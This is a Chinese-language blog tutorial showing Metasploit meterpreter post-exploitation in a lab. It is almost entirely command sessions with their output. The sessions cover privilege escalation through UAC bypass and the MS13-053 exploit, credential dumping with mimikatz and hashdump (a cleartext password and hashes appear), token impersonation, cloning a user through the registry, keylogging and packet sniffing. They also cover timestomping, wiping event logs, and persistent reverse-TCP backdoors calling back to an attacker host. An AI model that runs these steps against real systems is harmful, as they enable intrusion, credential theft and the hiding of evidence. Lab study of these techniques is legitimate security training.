---
title: metasploit在后渗透中的作用
abbrlink: 9668f403
date: 2018-03-19 13:23:50
tags:
  - Kali
  - Linux
  - tools
category: [渗透测试,工具使用]
---
## 0x00 前言
这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。
## 0x01 权限提升
<!--more-->
1. getsystem
```
meterpreter > getuid
Server username: TEST\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

2. bypassuac


```
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/windows/local/bypassuac
msf exploit(windows/local/bypassuac) > set session 1
session => 1
msf exploit(windows/local/bypassuac) > exploit

[*] Started reverse TCP handler on 192.168.161.138:4444 

```


3. 利用windows提权漏洞进行提升


 ```
 meterpreter > background 
[*] Backgrounding session 1...
msf exploit(windows/local/bypassuac_vbs) > use post/windows/gather/enum_patches 
msf post(windows/gather/enum_patches) > set session 1
session => 1
msf post(windows/gather/enum_patches) > exploit

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[*] KB2778930 applied
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
[*] Post module execution completed
msf post(windows/gather/enum_patches) > search MS13-053

Matching Modules
================

   Name                                        Disclosure Date  Rank     Description
   ----                                        ---------------  ----     -----------
   exploit/windows/local/ms13_053_schlamperei  2013-12-01       average  Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)
   exploit/windows/local/ppr_flatten_rec       2013-05-15       average  Windows EPATHOBJ::pprFlattenRec Local Privilege Escalation


msf post(windows/gather/enum_patches) > use exploit/windows/local/ms13_053_schlamperei
msf exploit(windows/local/ms13_053_schlamperei) > show options

Module options (exploit/windows/local/ms13_053_schlamperei):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 SP0/SP1


msf exploit(windows/local/ms13_053_schlamperei) > 
msf exploit(windows/local/ms13_053_schlamperei) > set session 1
session => 1
msf exploit(windows/local/ms13_053_schlamperei) > exploit

[*] Started reverse TCP handler on 192.168.161.138:4444 
[*] Launching notepad to host the exploit...
[+] Process 2980 launched.
[*] Reflectively injecting the exploit DLL into 2980...
[*] Injecting exploit into 2980...
[*] Found winlogon.exe with PID 432
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (179779 bytes) to 192.168.161.132
[*] Meterpreter session 2 opened (192.168.161.138:4444 -> 192.168.161.132:49959) at 2018-03-19 16:56:51 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

 ```




## 0x02 域管理员嗅探

```
msf exploit(multi/handler) > use post/windows/gather/enum_domain
msf post(windows/gather/enum_domain) > show options 

Module options (post/windows/gather/enum_domain):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf post(windows/gather/enum_domain) > set session 1
session => 1
msf post(windows/gather/enum_domain) > exploit

[+] FOUND Domain: test
[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)
[*] Post module execution completed
msf post(windows/gather/enum_domain) > exploit

[+] FOUND Domain: test
[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)
[*] Post module execution completed

```


## 0x03抓取密码
```
meterpreter > load mimikatz 
Loading extension mimikatz...Success.
meterpreter > help
...
Mimikatz Commands
=================

    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds
    livessp           Attempt to retrieve livessp creds
    mimikatz_command  Run a custom command
    msv               Attempt to retrieve msv creds (hashes)
    ssp               Attempt to retrieve ssp creds
    tspkg             Attempt to retrieve tspkg creds
    wdigest           Attempt to retrieve wdigest creds

meterpreter > wdigest 
[!] Not currently running as SYSTEM
[*] Attempting to getprivs
[+] Got SeDebugPrivilege
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
0;49485   NTLM                                    
0;293672  Kerberos   TEST          Administrator  TopSec_2017
0;996     Negotiate  TEST          TOPSEC$        ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c 
0;999     Negotiate  TEST          TOPSEC$        ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c 

```
或者
```
msf post(windows/gather/hashdump) > exploit

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 2739ba60d0407daf0d866cb3ee4b6b9f...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:f013ff76154a124f8cfc32f654582420:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


[*] Post module execution completed

```

## 0x04假冒令牌
`空格和斜杠注意转译`

```
meterpreter >  use incognito
Loading extension incognito...Success.
meterpreter > help
...
Incognito Commands
==================

    Command              Description
    -------              -----------
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes for every token

meterpreter > list_tokens 
Usage: list_tokens <list_order_option>

Lists all accessible tokens and their privilege level

OPTIONS:

    -g        List tokens by unique groupname
    -u        List tokens by unique username

meterpreter > list_tokens  -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
TEST\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > impersonate_token NT AUTHORITY\\SYSTEM
[-] User token NT not found
meterpreter > impersonate_token NT\ AUTHORITY\\SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

## 0X05注册表操作

```
meterpreter > reg -h
Usage: reg [command] [options]

Interact with the target machine's registry.

OPTIONS:

    -d <opt>  The data to store in the registry value.
    -h        Help menu.
    -k <opt>  The registry key path (E.g. HKLM\Software\Foo).
    -r <opt>  The remote machine name to connect to (with current process credentials
    -t <opt>  The registry value type (E.g. REG_SZ).
    -v <opt>  The registry value name (E.g. Stuff).
    -w        Set KEY_WOW64 flag, valid values [32|64].
COMMANDS:

    enumkey	Enumerate the supplied registry key [-k <key>]
    createkey	Create the supplied registry key  [-k <key>]
    deletekey	Delete the supplied registry key  [-k <key>]
    queryclass Queries the class of the supplied key [-k <key>]
    setval	Set a registry value [-k <key> -v <val> -d <data>]
    deleteval	Delete the supplied registry value [-k <key> -v <val>]
    queryval	Queries the data contents of a value [-k <key> -v <val>]

```

下面演示通过注册表设置开机自启动

```
meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
Enumerating: HKLM\software\microsoft\windows\currentversion\run

  Values (1):

	VMware User Process

meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note -d 'C:\Windows\System32\notepad.exe'
Successfully set note of REG_SZ.
meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
Enumerating: HKLM\software\microsoft\windows\currentversion\run

  Values (2):

	VMware User Process
	note

meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note 
Key: HKLM\software\microsoft\windows\currentversion\run
Name: note
Type: REG_SZ
Data: C:\Windows\System32\notepad.exe

```

下面演示怎么通过注册表复制克隆用户

```
meterpreter > reg enumkey -k HKLM\\sam\\sam\\domains\\account\\users
Enumerating: HKLM\sam\sam\domains\account\users

  Keys (3):

	000001F4
	000001F5
	Names

  Values (1):

	

meterpreter > shell
Process 1884 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\windows\system32>net user guest /active:yes                
net user guest /active:yes

C:\windows\system32>reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5
reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5
 sam\sam\domains\account\users\000001f4\F �Ѵ��ڣ�Ҫ������(Yes/No/All)? Yes
\ֵ sam\sam\domains\account\users\000001f4\V �Ѵ��ڣ�Ҫ������(Yes/No/All)?No  
�����ɹ����ɡ�

```


## 0x06端口转发
```
meterpreter > portfwd delete -l 3389
[*] Successfully stopped TCP relay on 0.0.0.0:3389
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.161.138
[*] Local TCP relay created: :3389 <-> 192.168.161.138:3389
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local         Remote                Direction
   -----  -----         ------                ---------
   1      0.0.0.0:3389  192.168.161.138:3389  Forward

1 total active port forwards.

```


## 0x07搜索文件
在awd攻防赛的时候很好用
```
meterpreter > search -f *flag*
Found 3 results...
    c:\flag.txt (39 bytes)
    c:\Users\administrator.TEST\AppData\Roaming\Microsoft\Windows\Recent\flag.txt.lnk (477 bytes)
    c:\Users\Administrator.ZGC-20160413JJL\AppData\Roaming\Microsoft\Windows\Recent\flag.txt.lnk (477 bytes)
```

## 0x08抓包

```
meterpreter > use sniffer
Loading extension sniffer...Success.
meterpreter > help

Sniffer Commands
================

    Command             Description
    -------             -----------
    sniffer_dump        Retrieve captured packet data to PCAP file
    sniffer_interfaces  Enumerate all sniffable network interfaces
    sniffer_release     Free captured packets on a specific interface instead of downloading them
    sniffer_start       Start packet capture on a specific interface
    sniffer_stats       View statistics of an active capture
    sniffer_stop        Stop packet capture on a specific interface

meterpreter > sniffer_interfaces

1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
3 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
4 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
5 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )

meterpreter > sniffer_start 5
[*] Capture started on interface 5 (50000 packet buffer)
meterpreter > sniffer_dump 5 /tmp/1.pcap
[*] Flushing packet capture buffer for interface 5...
[*] Flushed 2540 packets (1450560 bytes)
[*] Downloaded 036% (524288/1450560)...
[*] Downloaded 072% (1048576/1450560)...
[*] Downloaded 100% (1450560/1450560)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to /tmp/1.pcap
meterpreter > sniffer_stop 5
[*] Capture stopped on interface 5
[*] There are 29 packets (2263 bytes) remaining
[*] Download or release them using 'sniffer_dump' or 'sniffer_release'

```

## 0x09开启3389

```
meterpreter > run getgui -u haha -p password

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Setting user account for logon
[*] 	Adding User: haha with Password: password
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc
meterpreter > run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc

```
会新建个账号，并在后面删掉

## 0x0A改变文件时间

```
Usage: timestomp <file(s)> OPTIONS

OPTIONS:

    -a <opt>  Set the "last accessed" time of the file
    -b        Set the MACE timestamps so that EnCase shows blanks
    -c <opt>  Set the "creation" time of the file
    -e <opt>  Set the "mft entry modified" time of the file
    -f <opt>  Set the MACE of attributes equal to the supplied file
    -h        Help banner
    -m <opt>  Set the "last written" time of the file
    -r        Set the MACE timestamps recursively on a directory
    -v        Display the UTC MACE values of the file
    -z <opt>  Set all four attributes (MACE) of the file

meterpreter > timestomp -v flag.txt
[*] Showing MACE attributes for flag.txt
Modified      : 2017-02-22 14:55:50 +0800
Accessed      : 2017-01-11 20:53:57 +0800
Created       : 2017-01-11 20:53:57 +0800
Entry Modified: 2017-02-22 14:55:50 +0800
meterpreter > timestomp -v 1.txt
[*] Showing MACE attributes for 1.txt
Modified      : 2018-03-19 20:13:36 +0800
Accessed      : 2018-03-19 21:41:24 +0800
Created       : 2018-03-19 21:41:24 +0800
Entry Modified: 2018-03-19 21:41:24 +0800
meterpreter > timestomp 1.txt -f flag.txt
[*] Pulling MACE attributes from flag.txt
[*] Setting specific MACE attributes on 1.txt
meterpreter > timestomp -v 1.txt
[*] Showing MACE attributes for 1.txt
Modified      : 2017-02-22 14:55:50 +0800
Accessed      : 2017-01-11 20:53:57 +0800
Created       : 2017-01-11 20:53:57 +0800
Entry Modified: 2017-02-22 14:55:50 +0800
```


## 0x0B日志清除
```
meterpreter > clearev 
[*] Wiping 1692 records from Application...
[*] Wiping 6855 records from System...
[*] Wiping 2664 records from Security...
```

## 0X0C留后门
1. Metsvc(通过服务安装)

```
meterpreter > run metsvc 

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\ADMINI~1.TES\AppData\Local\Temp\ENDPAzIy...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
	 * Installing service metsvc
 * Starting service
Service metsvc successfully installed.

```

这个时候我们去连接它

```
msf exploit(multi/handler) > set payload windows/metsvc_bind_tcp
payload => windows/metsvc_bind_tcp
msf exploit(multi/handler) > set rhost 192.168.161.132
rhost => 192.168.161.132
msf exploit(multi/handler) > set lport 31337
lport => 31337
msf exploit(multi/handler) > exploit

[*] Started bind handler
[*] 192.168.161.132 - Meterpreter session 6 closed.  Reason: Died
[*] Meterpreter session 6 opened (127.0.0.1 -> 127.0.0.1) at 2018-03-19 21:37:23 +0800


```


2. persistence(通过自启动安装)
 
```
meterpreter > run persistence -U -i 5 -p 443 -r 192.168.161.138

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/TOPSEC_20180319.1312/TOPSEC_20180319.1312.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.161.138 LPORT=443
[*] Persistent agent script is 99606 bytes long
[+] Persistent Script written to C:\Users\ADMINI~1.TES\AppData\Local\Temp\xdoxmsHr.vbs
[*] Executing script C:\Users\ADMINI~1.TES\AppData\Local\Temp\xdoxmsHr.vbs
[+] Agent executed with PID 3528
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\jQiyGnPRxgnllmr
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\jQiyGnPRxgnllmr

```
然后重启试下
```
meterpreter > 
[*] 192.168.161.132 - Meterpreter session 4 closed.  Reason: Died
msf exploit(multi/handler) > [*] Sending stage (179779 bytes) to 192.168.161.132
[*] Meterpreter session 5 opened (192.168.161.138:443 -> 192.168.161.132:49169) at 2018-03-19 21:18:07 +0800

msf exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  5         meterpreter x86/windows  TEST\Administrator @ TOPSEC  192.168.161.138:443 -> 192.168.161.132:49169 (192.168.161.132)

msf exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > 


```
会留一个后门，并添加进启动项

## 0X0D键盘记录
```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump 
Dumping captured keystrokes...
mima<Shift><Right Shift>:12345679<^S>

meterpreter > keyscan_stop
Stopping the keystroke sniffer...

```

## 0X0E进程注入
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System             x86   0                                      
 232   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 320   312   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\csrss.exe
 368   480   msdtc.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\windows\System32\msdtc.exe
 372   312   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\wininit.exe
 384   364   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\windows\system32\csrss.exe
 432   364   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\windows\system32\winlogon.exe
 480   372   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\services.exe
 488   372   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\lsass.exe
...
meterpreter > migrate 3104
[*] Migrating to 3104

```

## 0x0F 截屏

```
eterpreter > use espia
Loading extension espia...Success.
meterpreter > screen
screengrab  screenshot  
meterpreter > screengrab 
Screenshot saved to: /home/daiker/zQBKZbTv.jpeg
```
